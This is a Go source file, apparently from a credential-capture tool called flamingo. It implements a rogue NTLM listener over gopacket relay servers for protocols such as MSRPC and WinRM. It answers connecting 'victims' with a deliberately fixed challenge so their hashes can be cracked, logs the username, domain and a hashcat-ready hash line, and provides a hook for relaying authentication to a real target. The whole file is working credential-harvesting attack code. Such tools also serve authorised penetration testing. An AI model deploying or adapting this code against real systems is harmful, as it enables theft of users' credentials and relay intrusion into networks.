package flamingo

import (
	"errors"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/mandiant/gopacket/pkg/relay"
	log "github.com/sirupsen/logrus"
)

// NTLMCapture adapts any gopacket relay.ProtocolServer to flamingo's
// credential pipeline.
//
// Upstream's servers speak a three-channel rendezvous per victim: the
// connection handler pushes an AuthResult carrying the NTLMSSP NEGOTIATE,
// blocks on Type2Ch until something hands it a CHALLENGE, pushes the
// AUTHENTICATE on Type3Ch, then blocks on ResultCh until something decides
// whether the logon succeeded. This type owns the other end of that
// rendezvous: it answers with flamingo's own fixed-challenge CHALLENGE,
// records the AUTHENTICATE, and refuses the logon.
//
// Two upstream limitations shape the implementation, and neither is optional
// to handle (see docs/plan-smb-msrpc-relay.md §3):
//
//   - Victim goroutines block on Type2Ch and ResultCh with no timeout of their
//     own, so every exit path here has to release both channels or the
//     goroutine, and the connection behind it, leak for the life of the
//     process. That is what abort and the deferred cleanup in exchange are
//     for.
//
//   - Stop only closes the listener. Connections that are already accepted
//     keep running and can still push an AuthResult afterwards, so the
//     receive loop keeps draining and aborting for a short grace window after
//     a stop rather than returning immediately.
//
// The Responder field is the seam for the relay phase: swapping in a
// responder backed by a relay.ProtocolClient turns capture into relay without
// touching the loop, the timeouts or the record format.
type NTLMCapture struct {
	// Proto is the protocol name recorded in the _proto field, e.g. "msrpc".
	Proto string

	// ServerAddr is the listen address recorded in the _server field.
	ServerAddr string

	// RecordWriter receives the captured credentials.
	RecordWriter *RecordWriter

	// Timeout bounds one victim's whole exchange, from the CHALLENGE being
	// offered to the AUTHENTICATE arriving. Zero means
	// NTLMCaptureTimeout.
	Timeout time.Duration

	// Responder decides the challenge a victim is answered with and whether
	// it is told the logon succeeded. Nil means capture only: flamingo's
	// fixed challenge, and always a failure.
	Responder NTLMResponder

	server  relay.ProtocolServer
	results chan relay.AuthResult
	done    chan struct{}
	stopped bool
	m       sync.Mutex
}

// NTLMCaptureTimeout bounds one victim's NTLM exchange. It covers the gap
// between the NEGOTIATE and the AUTHENTICATE, which for an HTTP-framed
// protocol such as WinRM spans two separate requests.
const NTLMCaptureTimeout = 30 * time.Second

// ntlmCaptureDrainGrace is how long the receive loop keeps releasing victims
// after a stop. Upstream's Stop only closes the listener, so a connection
// accepted a moment earlier can still arrive at the rendezvous.
const ntlmCaptureDrainGrace = time.Second

// ntlmCaptureQueue is the depth of the AuthResult channel handed to upstream.
// Upstream pushes from the victim's own goroutine and blocks if nobody is
// receiving, so the buffer keeps a burst of connections off each other's
// critical path.
const ntlmCaptureQueue = 32

// NTLMExchange is one victim's in-flight NTLM exchange, as handed to a
// NTLMResponder.
type NTLMExchange struct {
	// Proto and ServerAddr identify the listener that accepted the victim.
	Proto      string
	ServerAddr string

	// RemoteAddr is the victim's address as upstream reported it.
	RemoteAddr string

	// Type1 is the raw NTLMSSP NEGOTIATE message, and Flags and
	// ClientVersion are what could be decoded from it.
	Type1         []byte
	Flags         uint32
	ClientVersion string

	// Type2 is the CHALLENGE message the victim was actually answered with,
	// filled in once the responder has supplied it. For a relayed exchange
	// that is the target's challenge rather than flamingo's, which is what
	// the hashcat line has to be formatted against.
	Type2 []byte

	// Conn is the victim's connection, or nil for a server that does not
	// surface one. The HTTP-framed listeners (WinRM, WinRMS) leave it nil
	// because an exchange spans more than one request.
	Conn net.Conn
}

// NTLMResponder supplies the CHALLENGE a victim is answered with and decides
// the outcome it is told. Capture-only uses the fixed challenge and always
// refuses; the relay phase implements this against a relay.ProtocolClient so
// the challenge comes from the real target instead.
type NTLMResponder interface {
	// Challenge returns the NTLMSSP CHALLENGE message to answer x.Type1
	// with. An error abandons the exchange, releasing the victim.
	Challenge(x *NTLMExchange) ([]byte, error)

	// Authenticate is handed the victim's AUTHENTICATE message, both parsed
	// and raw, and reports whether the victim should be told the logon
	// succeeded. It is called after the credential has been recorded.
	Authenticate(x *NTLMExchange, auth *NTLMAuth, type3 []byte) bool
}

// ntlmCaptureResponder is the capture-only responder: flamingo's own
// fixed-challenge CHALLENGE, and never a successful logon.
//
// The fixed challenge is the whole point. Upstream's pkg/ntlm Server.Challenge
// generates a random one with no setter, which would make every captured hash
// uncrackable, so it is deliberately not used here.
type ntlmCaptureResponder struct{}

func (ntlmCaptureResponder) Challenge(x *NTLMExchange) ([]byte, error) {
	return NTLMChallengeMessage(x.Flags), nil
}

func (ntlmCaptureResponder) Authenticate(_ *NTLMExchange, _ *NTLMAuth, _ []byte) bool {
	return false
}

// NewNTLMCapture creates a capture-only adapter recording under the given
// protocol name and listen address.
func NewNTLMCapture(proto string, serverAddr string, rw *RecordWriter) *NTLMCapture {
	return &NTLMCapture{
		Proto:        proto,
		ServerAddr:   serverAddr,
		RecordWriter: rw,
		Timeout:      NTLMCaptureTimeout,
	}
}

// Start binds the given protocol server and begins servicing its exchanges.
// The server is owned by the adapter from here on: Stop stops it.
func (c *NTLMCapture) Start(server relay.ProtocolServer) error {
	if server == nil {
		return errors.New("no protocol server")
	}

	c.m.Lock()
	if c.stopped {
		c.m.Unlock()
		return errors.New("capture is shut down")
	}
	if c.server != nil {
		c.m.Unlock()
		return errors.New("capture is already started")
	}
	results := make(chan relay.AuthResult, ntlmCaptureQueue)
	done := make(chan struct{})
	c.server, c.results, c.done = server, results, done
	c.m.Unlock()

	if err := server.Start(results); err != nil {
		// Leave the adapter stopped rather than half-started, so a caller
		// that ignores the error cannot later stop a server that never ran.
		c.m.Lock()
		c.server = nil
		c.stopped = true
		close(done)
		c.m.Unlock()
		return err
	}

	go c.loop(results, done)
	return nil
}

// IsStopped reports whether the adapter has been stopped.
func (c *NTLMCapture) IsStopped() bool {
	c.m.Lock()
	defer c.m.Unlock()
	return c.stopped
}

// Stop closes the listener and releases every victim the adapter is holding.
// It returns promptly: the exchanges in flight abandon themselves as soon as
// the done channel closes, and the post-stop drain runs in the background.
func (c *NTLMCapture) Stop() error {
	c.m.Lock()
	if c.stopped {
		c.m.Unlock()
		return nil
	}
	c.stopped = true
	server := c.server
	if c.done != nil {
		close(c.done)
	}
	c.m.Unlock()

	if server != nil {
		return server.Stop()
	}
	return nil
}

// loop hands each victim its own goroutine, so a slow or silent one cannot
// hold up the rest, and keeps draining for a grace window after a stop.
func (c *NTLMCapture) loop(results chan relay.AuthResult, done chan struct{}) {
	for {
		select {
		case a := <-results:
			go c.exchange(a, done)
		case <-done:
			c.drain(results)
			return
		}
	}
}

// drain releases victims that were queued at stop time or that arrive during
// the grace window afterwards. Without it their goroutines would sit on
// Type2Ch forever, since upstream's Stop does not touch connections it has
// already accepted.
func (c *NTLMCapture) drain(results chan relay.AuthResult) {
	grace := time.NewTimer(ntlmCaptureDrainGrace)
	defer grace.Stop()
	for {
		select {
		case a := <-results:
			c.abort(a)
		case <-grace.C:
			return
		}
	}
}

// exchange runs one victim's rendezvous: answer the NEGOTIATE with a
// CHALLENGE, record the AUTHENTICATE, report the outcome.
func (c *NTLMCapture) exchange(a relay.AuthResult, done chan struct{}) {
	answered, reported := false, false
	defer func() {
		if !answered {
			// The victim's goroutine is parked on Type2Ch and closing it is
			// the only thing that will release it: upstream treats a closed
			// channel as "no challenge available" and gives up.
			ntlmCloseChallenge(a.Type2Ch)
		}
		if !reported {
			// ResultCh is buffered for one value and upstream writes to it
			// on its own error paths, so send without blocking and never
			// close it.
			ntlmFailResult(a.ResultCh)
			if a.ServerConn != nil {
				// An exchange that was abandoned leaves upstream blocked on
				// a read with no deadline. Closing the connection is what
				// actually ends that goroutine.
				a.ServerConn.Close()
			}
		}
	}()

	x := &NTLMExchange{
		Proto:      c.Proto,
		ServerAddr: c.ServerAddr,
		RemoteAddr: ntlmSourceAddr(a),
		Type1:      a.NTLMType1,
		Conn:       a.ServerConn,
	}
	x.Flags, x.ClientVersion = ParseNTLMNegotiate(a.NTLMType1)

	challenge, err := c.responder().Challenge(x)
	if err != nil {
		log.Debugf("%s no challenge for %s: %s", c.Proto, x.RemoteAddr, err)
		return
	}
	x.Type2 = challenge

	timeout := time.NewTimer(c.timeout())
	defer timeout.Stop()

	if a.Type2Ch != nil {
		select {
		case a.Type2Ch <- challenge:
			answered = true
		case <-timeout.C:
			log.Debugf("%s timed out offering a challenge to %s", c.Proto, x.RemoteAddr)
			return
		case <-done:
			return
		}
	}

	var type3 []byte
	if a.NTLMType3 != nil {
		// A server that completed the exchange on its own before handing it
		// over, which none do today but the interface allows.
		type3 = a.NTLMType3
	} else if a.Type3Ch == nil {
		return
	} else {
		select {
		case type3 = <-a.Type3Ch:
		case <-timeout.C:
			log.Debugf("%s timed out waiting for an authenticate from %s", c.Proto, x.RemoteAddr)
			return
		case <-done:
			return
		}
	}

	auth, err := ParseNTLMAuthenticate(FindNTLMSSP(type3))
	if err != nil {
		log.Debugf("%s authenticate from %s: %s", c.Proto, x.RemoteAddr, err)
		return
	}
	c.record(x, auth)

	// The credential is recorded before the outcome is decided, so a
	// responder that fails has still handed us the hash.
	success := c.responder().Authenticate(x, auth, type3)
	reported = true
	select {
	case a.ResultCh <- success:
	default:
	}
}

// abort releases a victim the adapter will never service, closing its
// connection so the goroutine behind it ends rather than parking on a read
// with no deadline.
func (c *NTLMCapture) abort(a relay.AuthResult) {
	ntlmCloseChallenge(a.Type2Ch)
	ntlmFailResult(a.ResultCh)
	if a.ServerConn != nil {
		a.ServerConn.Close()
	}
}

// record writes a captured AUTHENTICATE message to the record writer, in the
// same shape as every other flamingo NTLM listener.
func (c *NTLMCapture) record(x *NTLMExchange, a *NTLMAuth) {
	if c.RecordWriter == nil {
		return
	}
	fields := map[string]string{
		"_server":      x.ServerAddr,
		"username":     a.User,
		"domain":       a.Domain,
		"workstation":  a.Workstation,
		"ntlm_version": a.NTLMVersion(),
	}
	// The line is formatted against the challenge the victim was actually
	// answered with, which for a relayed exchange is the target's.
	if line, mode := NTLMHashcatChallenge(a, NTLMServerChallenge(x.Type2)); line != "" {
		fields["hashcat"] = line
		fields["hashcat_mode"] = strconv.Itoa(mode)
	}
	version := a.Version
	if version == "" {
		version = x.ClientVersion
	}
	if version != "" {
		fields["client_version"] = version
	}
	c.RecordWriter.Record("credential", c.Proto, x.RemoteAddr, fields)
}

// responder is the configured responder, or the capture-only default.
func (c *NTLMCapture) responder() NTLMResponder {
	if c.Responder != nil {
		return c.Responder
	}
	return ntlmCaptureResponder{}
}

// timeout is the configured exchange timeout, or the default.
func (c *NTLMCapture) timeout() time.Duration {
	if c.Timeout > 0 {
		return c.Timeout
	}
	return NTLMCaptureTimeout
}

// ntlmSourceAddr is the victim's address, preferring what upstream reported
// and falling back to the connection when a server leaves it blank.
func ntlmSourceAddr(a relay.AuthResult) string {
	if a.SourceAddr != "" {
		return a.SourceAddr
	}
	if a.ServerConn != nil {
		return a.ServerConn.RemoteAddr().String()
	}
	return ""
}

// ntlmCloseChallenge releases a victim waiting for a challenge. Only the
// adapter ever sends on this channel, so closing it is safe, and it is the
// only signal upstream understands as "give up".
func ntlmCloseChallenge(ch chan []byte) {
	if ch != nil {
		close(ch)
	}
}

// ntlmFailResult reports a failed logon without blocking. The channel is
// buffered for one value and upstream writes to it on its own error paths, so
// a full buffer means the victim has already been answered.
func ntlmFailResult(ch chan bool) {
	if ch == nil {
		return
	}
	select {
	case ch <- false:
	default:
	}
}
